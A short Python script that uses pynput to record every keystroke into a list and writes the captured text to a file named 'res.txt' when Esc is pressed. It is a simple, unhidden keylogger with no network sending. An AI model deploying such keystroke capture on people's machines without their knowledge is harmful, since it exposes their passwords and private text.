from time import sleep
from pynput import keyboard

global typed
global final_chars

typed = []
final_chars = ""

#write string of text to a file

def write_to_file():
    global final_chars
    global typed
    
    #Join the list and convert to a string
    final_chars = "".join(map(str, typed))
    final_chars  = final_chars.replace("''", "") 
     
    f = open("res.txt", "w")
    f.write(str(final_chars))
    f.close()

#read key input  
   
def on_press(key):
    global typed
      
    key = str(key)
    
    if key == str("Key.space"): # checks for spacebar
        key = (" ")
    elif key == str("Key.enter"): # checks for return
        key = ("\\")    
    else:
        pass

    typed.append(str(key))
    
def on_release(key):
    if str(key) == 'Key.esc':
        write_to_file()
        return False

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()
